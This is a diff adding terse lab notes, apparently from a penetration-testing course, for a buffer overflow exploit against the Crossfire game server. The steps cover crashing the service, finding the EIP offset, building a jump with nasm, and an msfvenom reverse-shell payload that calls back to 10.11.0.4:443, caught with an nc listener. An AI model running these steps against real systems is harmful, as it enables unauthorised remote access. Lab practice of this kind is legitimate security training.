@@ -1,1 +1,42 @@
+Replicating the Crash
+
+root@debian:~# cd /usr/games/crossfire/bin/
+root@debian:/usr/games/crossfire/bin# ./crossfire
+root@debian:~# edb
+kali@kali:~$ python poc_01.py
+
+
+
+
+
+Controlling EIP 
+
+kali@kali:~$ msf-pattern_create -l 4379
+kali@kali:~$ msf-pattern_offset -q 46367046
+
+
+
+
+
+Locating Space for Our Shellcode 
+
+kali@kali:~$ msf-nasm_shell
+nasm > add eax,12
+nasm > jmp eax
+
+
+
+
+
+
+Getting a Shell 
+
+kali@kali:~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
+kali@kali:~$ sudo nc -lnvp 443
+id
+whoami
+kali@kali:~$ nc -lnvp 443
+whoami
+
+
 
